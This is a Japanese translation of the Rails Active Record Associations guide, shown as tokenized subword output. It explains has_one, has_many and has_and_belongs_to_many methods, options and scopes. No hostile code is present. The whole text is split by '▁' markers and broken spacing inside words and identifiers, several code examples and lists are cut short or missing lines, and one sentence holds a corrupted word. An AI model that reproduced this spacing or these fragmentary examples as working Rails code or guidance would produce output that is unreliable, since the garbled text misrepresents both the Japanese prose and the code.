▁@ account ▁= ▁@ supplier . build _ account ( ter m s : ▁" N e t ▁ 30 ")
▁この オブジェクトは 、 渡 された 属性 を使用して インスタンス 化 され 、 そのオブジェクト の 外部キー を 介 して リンク が 設定 されます 。 そして 、 関連付けられた モデル で 指定 されている 検証 が すべて パス すると 、 この 関連付けられたオブジェクト は 保存されます 。
▁@ account ▁= ▁@ supplier . create _ account ( ter m s : ▁" N e t ▁ 30 ")
▁#### ▁` has _ one ` の オプション
▁Rails の デフォルトの ` has _ one ` 関連付け は 、 ほとんど の場合 カスタマイズ 不要です が 、 時に は 関連付け の動作 を カスタマイズ した くなる ことも ある と思います 。
▁これは 、 作成 するときに オプションを 渡す ことで 簡単に カスタマイズ できます 。
▁has _ one ▁: account , ▁class _ name : ▁" B i ll ing ", ▁ dependent : ▁: null if y
▁` has _ one ` 関連付け では 以下の オプション が サポート されます 。
▁* ▁`: as `
▁* ▁`: primary _ key `
▁* ▁`: source `
▁* ▁`: source _ type `
▁* ▁`: through `
▁#### # ▁`: as `
▁`: as ` オプション に ` true ` を設定する と 、 ポリモーフィック 関連付けを 指定できます 。
▁たとえば 、 S up p li er に アカウント が 1 つ あり 、 アカウント を含む モデルの 実際の 名前 が ` Account ` ではなく ` B i ll ing ` になっている 場合 、 以下のように モデル名 を 指定できます 。
▁has _ one ▁: account , ▁class _ name : ▁" B i ll ing "
▁ オ ー ナ ー オブジェクトが destroy された 時に 、 それ に 関連付けられたオブジェクト を どう するか を 制 御 します 。
▁* ▁`: destroy ` を指定すると 、 関連付けられたオブジェクト も 同時に destroy されます 。
▁* ▁`: delete ` を指定すると 、 関連付けられたオブジェクト は データベースから 直接 削除 されます 。 このとき コールバック は 実行 されません 。
▁* ▁`: null if y ` を指定すると 、 外部キー が ` NULL ` に 設定 されます 。
▁このとき コールバック は 実行 されません 。
▁* ▁`: re st ri ct _ with _ except ion ` を指定すると 、 関連付けられた レコード がある場合 に 例外が発生します 。
▁* ▁`: re st ri ct _ with _ error ` を指定すると 、 関連付けられたオブジェクト がある場合 に エラー が オ ー ナ ー に追加 されます 。
▁` N O T ▁ NULL ` データベース 制 約 のある 関連付け では 、`: null if y ` オプションを 与え ないように する必要があります 。
▁ そのような 関連付けを destroy する ` dependent ` を 設定 し なかった 場合 、 関連付けられたオブジェクト を変更 でき なく な ってしまいます 。 これは 、 最初に 関連付けられたオブジェクト の 外部キー が ` NULL ` 値 になってしまい 、 この 値 は 許 されていない ためです 。
▁Rails の 慣 例 では 、 相手 の モデル 上の 外部キー を保持し ている カラム 名 については 、 その モデル名 に サ フ ィ ッ ク ス ▁` _ id ` ▁ を追加した 関連付け 名 が 使用される ことを前提とし ます 。
▁has _ one ▁: account , ▁ foreign _ key : ▁" s up p _ id "
▁`: inverse _ of ` オプションは 、 その 関連付け の 逆 関連付け となる ` belongs _ to ` 関連付け の名前 を指定します 。
▁`: through ` または `: as ` オプション と 組み合わせ た場合 は 無効 です 。
▁has _ one ▁: account , ▁ inverse _ of : ▁: supplier
▁ belongs _ to ▁: supplier , ▁ inverse _ of : ▁: account
▁#### # ▁`: primary _ key `
▁Rails の 慣 例 では 、 モデルの 主キー は ` id ` カラム に保存 されている ことを前提とし ます 。
▁`: primary _ key ` オプション で 主キー を明示的に指定 することで これを 上 書き することができます 。
▁#### # ▁`: source `
▁`: source ` オプションは 、` has _ one ▁: through ` 関連付け における 「 ソース の 」 関連付け 名 、 つまり 関連付け 元の 名前 を指定します 。
▁#### # ▁`: source _ type `
▁`: source _ type ` オプションは 、 ポリモーフィック 関連付けを 介 して 行 わ れる ` has _ one ▁: through ` 関連付け における 「 ソース の 」 関連付け タイプ 、 つまり 関連付け 元の タイプ を指定します 。
▁#### # ▁`: through `
▁`: through ` オプションは 、 クエリ 実行 時に 経 由 する 結合 ( join ) モデル を指定します 。
▁#### ▁` has _ one ` の スコープ について
▁ 場合によっては ` has _ one ` で 使用される クエリ を カスタマイズ した くなる ことがあります 。
▁has _ one ▁: account , ▁-> ▁ { ▁ where ▁ active : ▁true ▁ }
▁has _ one ▁: account , ▁-> ▁ { ▁ where ▁" confirm ed ▁= ▁1 " ▁ }
▁ belongs _ to ▁: re present at ive
▁class ▁ Re present at ive ▁< ▁ActiveRecord :: Base
▁has _ many ▁: account s
▁上の 例 で 、 S up p li er から 代 表 ( Re present at ive ) を `@ supplier . account . re present at ive ` のように 直接 取り出す 機 会 が 頻繁に ある のであれば 、 S up p li er から Account への 関連付け に Re present at ive を あ ら か じ め include しておくこと で 無 駄 な クエリ を 減 ら し 、 効率 を 高 め ることができます 。
▁has _ one ▁: account , ▁-> ▁ { ▁ include s ▁: re present at ive ▁ }
▁` read only ` を指定すると 、 関連付けられたオブジェクト を 取り出す ときに 読み出し 専 用 になります 。
▁if ▁@ supplier . account . nil ?
▁@ m s g ▁= ▁" No ▁ account ▁f ound ▁for ▁this ▁ supplier "
▁` has _ one ` 関連付け に オブジェクトを ア サ イン すると 、 外部キー を更新する ために そのオブジェクト は自動的に 保存されます 。
▁さらに 、 置き換え られ る オブジェクトは 、 これは 外部キー が変更され た こと によって すべて 自動的に 保存されます 。
▁ 関連付けられている オブジェクト 同士 のいずれか 一方 が 検証 ( validation ) エラー で 保存 に 失敗する と 、 ア サ イン の 式 から は ` false ` が 返 され 、 ア サ イン は キ ャ ン セ ル されます 。
▁ 親 オブジェクト ( ` has _ one ` 関連付けを 宣言 している 側 の オブジェクト ) が 保存 され ない場合 ( つまり ` new _ record ?` が ` true ` を返す 場合 ) 、 子 オブジェクトは 追加 時に 保存 されません 。
▁ 親 オブジェクトが 保存 された 場合は 、 子 オブジェクトは 保存されます 。
▁` has _ one ` 関連付け に オブジェクトを ア サ イン し 、 しか も そのオブジェクト を保存し たくない 場合 、` association . build ` メソッドを使用して ください 。
▁### ▁` has _ many ` 関連付け の詳細
▁` has _ many ` 関連付け は 、 他の モデルと の間に 「 1 対 多 」 の つ な が り を作成します 。
▁ データベースの 観 点 では 、 この 関連付け において は 相手 の クラス が 外部キー を 持 ち ます 。 この 外部キー は 相手 の クラスの インスタンス を参照 します 。
▁#### ▁` has _ many ` で 追加 される メソッド
▁` has _ many ` 関連付けを 宣言 した クラス では 、 以下の 16 の メソッドを 自動的に 利用 できるようになります 。
▁* ▁` collection ( force _ reload ▁= ▁false ) `
▁* ▁` collection < < ( object , ▁ ... )
▁* ▁` collection . delete ( object , ▁ ... )
▁* ▁` collection . destroy ( object , ▁ ... )
▁* ▁` collection _ s ing ul ar _ id s `
▁* ▁` collection . clear `
▁* ▁` collection . empty ?
▁* ▁` collection . size `
▁* ▁` collection . find (...)
▁* ▁` collection . where (...)
▁* ▁` collection . exists ? (...)
▁* ▁` collection . build ( attributes ▁= ▁ { } , ▁ ... )
▁* ▁` collection . create ( attributes ▁= ▁ { }) `
▁* ▁` collection . create ! (
▁上の メソッドの ` collection ` の 部分 は プ レ ー ス ホ ル ダ であり 、 実際には ` has _ many ` への 1 番目の 引数として 渡 された シンボル に置き換え られます 。 また 、` collection _ s ing ul ar ` の 部分 は シンボル の 単数形 に置き換え られます 。
▁ orders ( force _ reload ▁= ▁false )
▁ orders < < ( object , ▁ ... )
▁ orders . delete ( object , ▁ ... )
▁ orders . destroy ( object , ▁ ... )
▁ order _ id s
▁ orders . clear
▁ orders . empty ?
▁ orders . size
▁ orders . find (...)
▁ orders . where (...)
▁ orders . exists ? (...)
▁ orders . build ( attributes ▁= ▁ { } , ▁ ... )
▁ orders . create ( attributes ▁= ▁ { })
▁ attributes ▁= ▁ { }) `
▁#### # ▁` collection ( force _ reload ▁= ▁false ) `
▁` collection ` メソッドは 、 関連付けられた すべての オブジェクト の配列 を返します 。
▁ 関連付けられたオブジェクト が ない場合は 、 空 の配列 を 1 つ 返します 。
▁@ orders ▁= ▁@ customer . orders
▁#### # ▁` collection < < ( object , ▁ ... )
▁` collection < < ` メソッドは 、 1 つ 以上 の オブジェクトを コレクション に追加します 。 このとき 、 追加 される オブジェクトの 外部キー は 、 呼び出し 側 モデルの 主キー に 設定 されます 。
▁@ customer . orders ▁< < ▁@ order 1
▁#### # ▁` collection . delete ( object , ▁ ... )
▁` collection . delete ` メソッドは 、 外部キー を ` NULL ` に設定する ことで 、 コレクション から 1 つ または 複数の オブジェクトを 削除 します 。
▁@ customer . orders . delete (@ order 1 )
▁WARN ING : ▁ 削除 の され 方は これ だけ ではありません 。 オブジェクト 同士 が ` dependent : ▁: destroy ` で 関連付けられている 場合は destroy されます が 、 オブジェクト 同士 が ` dependent : ▁: delete _ all ` で 関連付けられている 場合は delete されます ので ご注意ください 。
▁#### # ▁` collection . destroy ( object , ▁ ... )
▁` collection . destroy ` は 、 コレクション に 関連付けられている オブジェクト に対して ` destroy ` を実行する ことで 、 コレクション から 1 つ または 複数の オブジェクトを 削除 します 。
▁@ customer . orders . destroy (@ order 1 )
▁WARN ING : ▁ この場合 オブジェクトは _ 無 条件 で _ データベースから 削除 されます 。 このとき 、`: dependent ` オプション が どのように 設定 されて いて も 無視 して 削除 が 行われます 。
▁` collection = ` メソッドは 、 指定 した オブジェクト で その コレクション の内容 を 置き換え ます 。 元 から あった オブジェクトは 削除 されます 。
▁#### # ▁` collection _ s ing ul ar _ id s `
▁` collection _ s ing ul ar _ id s ` メソッドは 、 その コレクション に含まれる オブジェクトの id を 配列 にしたもの を返します 。
▁@ order _ id s ▁= ▁@ customer . order _ id s
▁` collection _ s ing ul ar _ id s = ` メソッドは 、 指定された 主キー id を持つ オブジェクトの 集 まり で コレクション の内容 を 置き換え ます 。 元 から あった オブジェクトは 削除 されます 。
▁#### # ▁` collection . clear `
▁` collection . clear ` メソッドは 、 コレクション から すべての オブジェクトを 削除 します 。
▁` dependent : ▁: destroy ` で 関連付けられたオブジェクト がある場合 は 、 それらの オブジェクトは destroy されます 。 ` dependent : ▁: delete _ all ` で 関連付けられたオブジェクト がある場合 は 、 データベースから 直接 delete されます 。 それ以外の 場合は 単 に 外部キー が ` NULL ` に 設定 されます 。
▁#### # ▁` collection . empty ?
▁` collection . empty ?` メソッドは 、 関連付けられたオブジェクト が コレクション に 含 まれ ていない 場合に ` true ` を返します 。
▁<% ▁if ▁@ customer . orders . empty ?
▁ 注文 はありません 。
▁#### # ▁` collection . size `
▁` collection . size ` メソッドは 、 コレクション に含まれる オブジェクトの 数 を返します 。
▁@ order _ count ▁= ▁@ customer . orders . size
▁#### # ▁` collection . find (...)
▁` collection . find ` メソッドは 、 コレクション に含まれる オブジェクトを 検索 します 。
▁このメソッド で 使用される 文法 は 、` ActiveRecord :: Base . find ` で 使用されている もの と同じ です 。
▁@ o p en _ orders ▁= ▁@ customer . orders . find (1)
▁#### # ▁` collection . where (...)
▁` collection . where ` メソッドは 、 コレクション に 含 まれ ている メソッドを 指定された 条件 に基いて 検索 します 。 このメソッド では オブジェクトは 遅 延 読み込み ( la z y ▁ load ) される 点 に ご注意ください 。 つまり 、 オブジェクト に 実際に アクセス が行われ る 時に だけ データベース への クエリ が発生し ます 。
▁@ o p en _ orders ▁= ▁@ customer . orders . where ( o p en : ▁true ) ▁# ▁ この時点で は クエリ は 行 わ れ ない
▁@ o p en _ order ▁= ▁@ o p en _ orders . first ▁# ▁ここで 初めて データベース への クエリ が行われ る
▁#### # ▁` collection . exists ? (...)
▁` collection . exists ?` メソッドは 、 指定された 条件 に 合 う オブジェクトが コレクション の中に 存 在 する かどうかをチェックし ます 。
▁#### # ▁` collection . build ( attributes ▁= ▁ { } , ▁ ... )
▁` collection . build ` メソッドは 、 関連付け が 行われた オブジェクトを 1 つ または 複 数 返します 。
▁ 返される オブジェクトは 、 渡 された 属性 に基いて インスタンス 化 され 、 外部キー を 経 由 する リンク が 作成されます 。 関連付けられたオブジェクト は 、 値が 返 された 時点 で はまだ 保存 されて _ い ない _ ことにご注意ください 。
▁@ order ▁= ▁@ customer . orders . build ( order _ date : ▁ Time . now ,
▁ order _ number : ▁" A 1 23 4 5 ")
▁#### # ▁` collection . create ( attributes ▁= ▁ { }) `
▁` collection . create ` メソッドは 、 関連付け が 行われた オブジェクトを 1 つ 返します 。
▁この オブジェクトは 、 渡 された 属性 を使用して インスタンス 化 され 、 そのオブジェクト の 外部キー を 介 して リンク が 作成されます 。 そして 、 関連付けられた モデル で 指定 されている 検証 が すべて パス すると 、 この 関連付けられたオブジェクト は 保存されます 。
▁@ order ▁= ▁@ customer . orders . create ( order _ date : ▁ Time . now ,
▁ order _ number : ▁" A 1 23 4 5 ")
▁#### # ▁` collection . create ! (
▁上の ` collection . create ` と同じ ですが 、 レコード が invalid の 場合に ` ActiveRecord :: Re c or d In valid ` が raise される 点が 異なります 。
▁#### ▁` has _ many ` の オプション
▁Rails の デフォルトの ` has _ many ` 関連付け は 、 ほとんど の場合 カスタマイズ 不要です が 、 時に は 関連付け の動作 を カスタマイズ した くなる ことも ある と思います 。
▁has _ many ▁: orders , ▁ dependent : ▁: delete _ all , ▁ validate : ▁: false
▁` has _ many ` 関連付け では 以下の オプション が サポート されます 。
▁たとえば 、 1 人 の 顧 客 ( customer ) が 複数の 注文 ( order ) を 持 っている が 、 実際の 注文 モデル名 が ` T r an s action ` である 場合には 以下のように 指定 します 。
▁has _ many ▁: orders , ▁class _ name : ▁" T r an s action "
▁ オ ー ナ ー オブジェクトが destroy された ときに 、 オ ー ナ ー に 関連付けられたオブジェクト を どう するか を 制 御 します 。
▁* ▁`: destroy ` を指定すると 、 関連付けられたオブジェクト も すべて 同時に destroy されます 。
▁* ▁`: delete ` を指定すると 、 関連付けられたオブジェクト はすべて データベースから 直接 削除 されます 。 このとき コールバック は 実行 されません 。
▁* ▁`: null if y ` を指定すると 、 外部キー はすべて ` NULL ` に 設定 されます 。
▁* ▁`: re st ri ct _ with _ except ion ` を指定すると 、 関連付けられた レコード が 1 つ でも ある 場合に 例外が発生します 。
▁* ▁`: re st ri ct _ with _ error ` を指定すると 、 関連付けられたオブジェクト が 1 つ でも ある 場合に エラー が オ ー ナ ー に追加 されます 。
▁has _ many ▁: orders , ▁ foreign _ key : ▁" c us t _ id "
▁Rails の 慣 例 では 、 関連付け の 主キー は ` id ` カラム に保存 されている ことを前提とし ます 。
▁` users ` テーブル に 主キー として ` id ` カラム があり 、 その他 に ` guid ` カラム も あるとします 。
▁さらに 、` to do s ` テーブル では ` users ` テーブル の ` id ` カラム の値 ではなく ` guid ` カラム の値 を保持し たい とします 。
▁これは 以下のように することで 実現 できます 。
▁has _ many ▁: to do s , ▁ primary _ key : ▁: guid
▁ここで `@ user . to do s . create ` を実行すると 、 `@ to do ` レコード の ` user _ id ` カラム の値 には `@ user ` の ` guid ` 値が 設定 されます 。
▁`: source ` オプションは 、` has _ many ▁: through ` 関連付け における 「 ソース の 」 関連付け 名 、 つまり 関連付け 元の 名前 を指定します 。
▁この オプションは 、 関連付け 名 から 関連付け 元の 名前 が自動的に 推 論 できない 場合 以外に は 使用 する必要はありません 。
▁`: source _ type ` オプションは 、 ポリモーフィック 関連付けを 介 して 行 わ れる ` has _ many ▁: through ` 関連付け における 「 ソース の 」 関連付け タイプ 、 つまり 関連付け 元の タイプ を指定します 。
▁`: validate ` オプションを ` false ` に設定する と 、 関連付けられたオブジェクト は 保存 時に 検証 ( validation ) されません 。
▁デフォルトは ` true ` であり 、 この場合 関連付けられたオブジェクト は 保存 時に 検証 されます 。
▁#### ▁` has _ many ` の スコープ について
▁ 場合によっては ` has _ many ` で 使用される クエリ を カスタマイズ した くなる ことがあります 。
▁has _ many ▁: orders , ▁-> ▁ { ▁ where ▁ process ed : ▁true ▁ }
▁has _ many ▁: confirm ed _ orders , ▁-> ▁ { ▁ where ▁" confirm ed ▁= ▁1 " ▁ } ,
▁class _ name : ▁" Order "
▁ 条件 は ハッシュ を使用して 指定 することもできます 。
▁has _ many ▁: confirm ed _ orders , ▁-> ▁ { ▁ where ▁ confirm ed : ▁true ▁ } ,
▁class _ name : ▁" Order "
▁` where ` オプション で ハッシュ を使用した 場合 、 この 関連付け で 作成された レコード は自動的に この ハッシュ を使用した スコープ に含まれる ようになります 。
▁この 例 の場合 、 `@ customer . confirm ed _ orders . create ` または `@ customer . confirm ed _ orders . build ` を実行すると 、 confirm ed カラム の 値が ` true ` の 注文 ( order ) が 常に 作成されます 。
▁#### # ▁` ext end ing `
▁` ext end ing ` メソッドは 、 関連付け プロキシ を 拡 張 する 名前付き モジュール を指定します 。
▁#### # ▁` group `
▁` group ` メソッドは 、 結果を グループ 化 する 際 の 属性 名を 1 つ 指定 します 。 内部 的に は SQL の ` G R O U P ▁BY ` 句 が使用されます 。
▁has _ many ▁: line _ item s , ▁-> ▁ { ▁ group ▁' orders . id ' ▁ } ,
▁ through : ▁: orders
▁ 顧 客 名 ( Customer ) から L in e I te m を `@ customer . orders . line _ item s ` のように 直接 取り出す 機 会 が 頻繁に ある のであれば 、 Customer と Order の 関連付け を行なう 時に L in e I te m を あ ら か じ め include しておくこと で 無 駄 な クエリ を 減 ら し 、 効率 を 高 め ることができます 。
▁has _ many ▁: orders , ▁-> ▁ { ▁ include s ▁: line _ item s ▁ }
▁#### # ▁` limit `
▁` limit ` メソッドは 、 関連付け を使用して 取得 できる オブジェクトの 総 数 を 制限 するのに 使用します 。
▁has _ many ▁: re c ent _ orders ,
▁-> ▁ { ▁ order (' order _ date ▁ de sc ') . limit ( 100 ) ▁ } ,
▁class _ name : ▁" Order ",
▁#### # ▁` of f set `
▁` of f set ` メソッドは 、 関連付け を使用して オブジェクトを 取得 する 際 の 開 始 オフ セット を指定します 。
▁たとえば 、` - > ▁ { ▁of f set ( 11 ) ▁ } ` と 指定 すると 、 最初の 11 レコード は スキップ され 、 12 レコード 目 から 返される ようになります 。
▁#### # ▁` order `
▁` order ` メソッドは 、 関連付けられたオブジェクト に 与え られ る 順序 を指定します 。 内部 的に は SQL の ` O R D ER ▁BY ` 句 が使用されます 。
▁has _ many ▁: orders , ▁-> ▁ { ▁ order ▁" date _ confirm ed ▁D E S C " ▁ }
▁` read only ` を指定すると 、 関連付けられたオブジェクト を 取り出す ときに 読み出し 専 用 になります 。
▁` select ` メソッドを使用すると 、 関連付けられたオブジェクト の データ 取り出し に 使用される SQL の ` SELECT ` 句 を 上 書き します 。
▁WARN ING : ▁ 独自の ` select ` メソッド を使用する場合 には 、 関連付けられている モデルの 主キー カラム と 外部キー カラム を 必ず 含 め て おいてください 。
▁ これを 行 わ なかった 場合 、 Rails で エラーが発生し ます 。
▁#### # ▁` d ist in ct `
▁` d ist in ct ` メソッドは 、 コレクション 内で 重複 が発生し ないように します 。
▁このメソッドは `: through ` オプション と 併 用 するときに 特に 便利です 。
▁has _ many ▁: read ing s
▁ person ▁= ▁ Person . create ( name : ▁' John ')
▁今度は ` d ist in ct ` を 設定 してみましょう 。
▁ person ▁= ▁ Person . create ( name : ▁' H on d a ')
▁上の 例 でも read ing は 2 つ あって 重複 しています 。
▁ 挿 入 時に も同様に 、 現在 残 っている すべての レコード が 一意 である ように する ( 関連付けを 検 査 したときに 重複 レコード が 決 して 発生 し ないように する ) には 、 テーブル 自体 に 一意 の インデックス を 追加する必要があります 。
▁なお 、` include ?` など を使用して 一意性 をチェックする と 競 合 が発生し やすい ので 注意 が必要です 。
▁ 関連付け で 強 制 的に 一意 になる ように するために ` include ?` を使用 しないでください 。
▁` has _ many ` 関連付け に オブジェクトを ア サ イン すると 、 外部キー を更新する ために そのオブジェクト は自動的に 保存されます 。
▁1 つの 文 で 複数の オブジェクトを ア サ イン すると 、 それら はすべて 保存されます 。
▁ 関連付けられている オブジェクトの 1 つ でも 検証 ( validation ) エラー で 保存 に 失敗する と 、 ア サ イン の 式 から は ` false ` が 返 され 、 ア サ イン は キ ャ ン セ ル されます 。
▁ 親 オブジェクト ( ` has _ many ` 関連付けを 宣言 している 側 の オブジェクト ) が 保存 され ない場合 ( つまり ` new _ record ?` が ` true ` を返す 場合 ) 、 子 オブジェクトは 追加 時に 保存 されません 。
▁ 親 オブジェクトが 保存 される と 、 関連付け られ ていた オブジェクト のうち 保存 されて い なかった メンバ はすべて 保存されます 。
▁` has _ many ` 関連付け に オブジェクトを ア サ イン し 、 しか も そのオブジェクト を保存し たくない 場合 、` collection . build ` メソッドを使用して ください 。
▁### ▁` has _ and _ belongs _ to _ many ` 関連付け の詳細
▁` has _ and _ belongs _ to _ many ` 関連付け は 、 他の モデルと の間に 「 多 対 多 」 の つ な が り を作成します 。
▁ データベースの 観 点 では 、 2 つの クラス は 中 間 で 結合テーブル を 介 して 関連付け られます 。 この 結合テーブル には 、 両方 の クラス を指す 外部キー が それぞれ 含 まれ ます 。
▁#### ▁` has _ and _ belongs _ to _ many ` で 追加 される メソッド
▁` has _ and _ belongs _ to _ many ` 関連付けを 宣言 した クラス では 、 以下の 16 の メソッドを 自動的に 利用 できるようになります 。
▁* ▁` collection . build ( attributes ▁= ▁ { }) `
▁上の メソッドの ` collection ` の 部分 は プ レ ー ス ホ ル ダ であり 、 実際には ` has _ and _ belongs _ to _ many ` への 1 番目の 引数として 渡 された シンボル に置き換え られます 。 また 、` collection _ s ing ul ar ` の 部分 は シンボル の 単数形 に置き換え られます 。
▁ assemblies ( force _ reload ▁= ▁false )
▁ assemblies < < ( object , ▁ ... )
▁ assemblies . delete ( object , ▁ ... )
▁ assemblies . destroy ( object , ▁ ... )
▁ assembly _ id s
▁ assemblies . clear
▁ assemblies . empty ?
▁ assemblies . size
▁ assemblies . find (...)
▁ assemblies . where (...)
▁ assemblies . exists ? (...)
▁ assemblies . build ( attributes ▁= ▁ { } , ▁ ... )
▁ assemblies . create ( attributes ▁= ▁ { })
▁ assemblies . create ! ( attributes ▁= ▁ { }) `
▁#### # ▁ 追加 の カラム メソッド
▁` has _ and _ belongs _ to _ many ` 関連付け で 使用している 中 間 の 結合テーブル が 、 2 つの 外部キー 以外に 何か カラム を 含 んで いる 場合 、 これらの カラム は 関連付けを 介 して 取り 出 される レコード に 属性 として 追加 されます 。
▁ 属性 が追加され た レコード は 常に 読み出し 専 用 になります 。 この ように して 読み 出 された 属性 に対する 変更 は 保存 できない ためです 。
▁WARN ING : ▁` has _ and _ belongs _ to _ many ` 関連付け で使用する 結合テーブル に このような 余 分 な カラム を追加する ことは お勧め できません 。
▁2 つの モデル を 多 対 多 で 結合 する 結合テーブル で このような 複雑な 振る舞い が 必要 になる のであれば 、` has _ and _ belongs _ to _ many ` ではなく ` has _ many ▁: through ` を使用して ください 。
▁@ assemblies ▁= ▁@ part . assemblies
▁` collection < < ` メソッドは 、 結合テーブル 上で レコード を作成し 、 それ によって 1 つ または 複数の オブジェクトを コレクション に追加します 。
▁@ part . assemblies ▁< < ▁@ assembly 1
▁NOT E : ▁このメソッドは ` collection . con cat ` および ` collection . push ` の エイリアス です 。
▁` collection . delete ` メソッドは 、 結合テーブル 上の レコード を削除し 、 それ によって 1 つ または 複数の オブジェクトを コレクション から 削除 します 。
▁このメソッド を実行して も オブジェクトは destroy されません 。
▁@ part . assemblies . delete (@ assembly 1 )
▁WARN ING : ▁このメソッド を 呼び出し ても 、 結合 レコード で コールバック は トリガ されません 。
▁` collection . destroy ` は 、 結合テーブル 上の レコード に対して ` destroy ` を実行する ( このとき コールバック も 実行 します ) ことで 、 コレクション から 1 つ または 複数の オブジェクトを 削除 します 。
▁@ part . assemblies . destroy (@ assembly 1 )
▁@ assembly _ id s ▁= ▁@ part . assembly _ id s
▁` collection . clear ` メソッドは 、 結合テーブル 上の レコード を削除し 、 それ によって すべての オブジェクトを コレクション から 削除 します 。
▁このメソッド を実行して も 、 関連付けられたオブジェクト は destroy されません 。
▁<% ▁if ▁@ part . assemblies . empty ?
▁ ※ この 部分 は どの ア セ ン ブ リ でも 使用 されません 。
▁@ assembly _ count ▁= ▁@ part . assemblies . size
▁このメソッド で 使用される 文法 は 、` ActiveRecord :: Base . find ` で 使用されている もの と同じ です 。
▁このメソッド では 、 オブジェクトが コレクション 内で 従 う 必要 のある 追加 条件 も 加 味 されます 。
▁@ assembly ▁= ▁@ part . assemblies . find (1)
▁` collection . where ` メソッドは 、 コレクション に 含 まれ ている メソッドを 指定された 条件 に基いて 検索 します 。 このメソッド では オブジェクトは 遅 延 読み込み ( la z y ▁ load ) される 点 に ご注意ください 。 つまり 、 オブジェクト に 実際に アクセス が行われ る 時に だけ データベース への クエリ が発生し ます 。
▁@ new _ assemblies ▁= ▁@ part . assemblies . where (" created _ at ▁ > ▁ ? ", ▁2 . day s . ago )
▁` collection . exists ?` メソッドは 、 指定された 条件 に 合 う オブジェクトが コレクション の中に 存 在 する かどうかをチェックし ます 。
▁#### # ▁` collection . build ( attributes ▁= ▁ { }) `
▁` collection . build ` メソッドは 、 関連付け が 行われた オブジェクトを 1 つ 返します 。
▁この オブジェクトは 、 渡 された 属性 で インスタンス 化 され 、 その 結合テーブル を 介 して リンク が 作成されます 。 ただし 、 関連付けられたオブジェクト は この時点で は 保存 s 慣 れ て _ い ない _ ことにご注意ください 。
▁@ assembly ▁= ▁@ part . assemblies . build ( { assembly _ name : ▁" T r an s m is s ion ▁ h o us ing " })
▁この オブジェクトは 、 渡 された 属性 を使用して インスタンス 化 され 、 結合テーブル を 介 して リンク が 作成されます 。 そして 、 関連付けられた モデル で 指定 されている 検証 が すべて パス すると 、 この 関連付けられたオブジェクト は 保存されます 。
▁@ assembly ▁= ▁@ part . assemblies . create ( { assembly _ name : ▁" T r an s m is s ion ▁ h o us ing " })
▁上の ` collection . create ` と同じ ですが 、 レコード が invalid の 場合に ` ActiveRecord :: Re c or d In valid ` が raise される 点が 異なります 。
▁#### ▁` has _ and _ belongs _ to _ many ` の オプション
▁Rails の デフォルトの ` has _ and _ belongs _ to _ many ` 関連付け は 、 ほとんど の場合 カスタマイズ 不要です が 、 時に は 関連付け の動作 を カスタマイズ した くなる ことも ある と思います 。
▁class ▁P ar t s ▁< ▁ActiveRecord :: Base
▁has _ and _ belongs _ to _ many ▁: assemblies ,
▁` has _ and _ belongs _ to _ many ` 関連付け では 以下の オプション が サポート されます 。
▁* ▁`: association _ foreign _ key `
▁* ▁`: join _ table `
▁#### # ▁`: association _ foreign _ key `
▁Rails の 慣 例 では 、 相手 の モデル を指す 外部キー を保持し ている 結合テーブル 上の カラム 名 については 、 その モデル名 に サ フ ィ ッ ク ス ▁` _ id ` ▁ を追加した 名前 が 使用される ことを前提とし ます 。
▁`: association _ foreign _ key ` オプション を使用すると 外部キー の名前 を直接 指定 することができます 。
▁ TIP : ▁`: foreign _ key ` オプション および `: association _ foreign _ key ` オプションは 、 多 対 多 の 自 己 結合 を行い たい ときに 便利です 。
▁has _ and _ belongs _ to _ many ▁: friend s ,
▁class _ name : ▁" User ",
▁ foreign _ key : ▁" this _ user _ id ",
▁ association _ foreign _ key : ▁" other _ user _ id "
▁たとえば 、 1 つの 部品 ( P ar t ) が 複数の 組 み 立 て ( A s s e m b ly ) で 使用 され 、 組 み 立 て を含む 実際の モデル名 が ` G ad get ` である 場合 、 次のように 設定 します 。
▁has _ and _ belongs _ to _ many ▁: assemblies , ▁class _ name : ▁" G ad get "
▁Rails の 慣 例 では 、 その モデル を指す 外部キー を保持し ている 結合テーブル 上の カラム 名 については 、 その モデル名 に サ フ ィ ッ ク ス ▁` _ id ` ▁ を追加した 名前 が 使用される ことを前提とし ます 。
▁#### # ▁`: join _ table `
▁ 辞 書 順 に基いて 生成された 結合テーブル の デフォルト 名 が 気 に 入 らない 場合 、`: join _ table ` オプション を使用して デフォルトの テーブル 名を 上 書き できます 。
▁#### ▁` has _ and _ belongs _ to _ many ` の スコープ について
▁ 場合によっては ` has _ and _ belongs _ to _ many ` で 使用される クエリ を カスタマイズ した くなる ことがあります 。
▁has _ and _ belongs _ to _ many ▁: assemblies , ▁-> ▁ { ▁ where ▁ active : ▁true ▁ }
▁-> ▁ { ▁ where ▁" factor y ▁= ▁' S e a tt le ' " ▁ }
▁-> ▁ { ▁ where ▁ factor y : ▁' S e a tt le ' ▁ }
▁` where ` オプション で ハッシュ を使用した 場合 、 この 関連付け で 作成された レコード は自動的に この ハッシュ を使用した スコープ に含まれる ようになります 。
▁この 例 の場合 、 `@ part s . assemblies . create ` または `@ part s . assemblies . build ` を実行すると 、` factor y ` カラム の 値が ` S e a tt le ` の 注文 ( order ) が 常に 作成されます 。
▁has _ and _ belongs _ to _ many ▁: assemblies , ▁-> ▁ { ▁ group ▁" factor y " ▁ }
▁` include s ` メソッドを使用すると 、 その 関連付け が 使用される ときに eager - load ▁( 訳 注 : p reload とは 異なる ) しておき たい 第 2 関連付け を指定する ことができます 。
▁-
▁たとえば of f set ( 11 ) と 指定 すると 、 最初の 11 レコード は スキップ され 、 12 レコード 目 から 返される ようになります 。
▁#### # ▁` un i q `
▁` un i q ` メソッドは 、 コレクション 内の 重複 を削除し ます 。
▁` has _ and _ belongs _ to _ many ` 関連付け に オブジェクトを ア サ イン すると 、 結合テーブル を更新する ために そのオブジェクト は自動的に 保存されます 。
▁ 親 オブジェクト ( ` has _ and _ belongs _ to _ many ` 関連付けを 宣言 している 側 の オブジェクト ) が 保存 され ない場合 ( つまり ` new _ record ?` が ` true ` を返す 場合 ) 、 子 オブジェクトは 追加 時に 保存 されません 。
▁` has _ and _ belongs _ to _ many ` 関連付け に オブジェクトを ア サ イン し 、 しか も そのオブジェクト を保存し たくない 場合 、` collection . build ` メソッドを使用して ください 。
▁### ▁ 関連付け の コールバック
▁ 通常の コールバック は 、 Active ▁Record オブジェクトの ラ イ フ サ イ ク ル の中で フック されます 。 これにより 、 オブジェクトの さまざまな 場所 で コールバック を 実行 できます 。
▁たとえば 、`: before _ save ` コールバック を使用して 、 オブジェクトが 保存 される 直 前に 何か を実行する ことができます 。
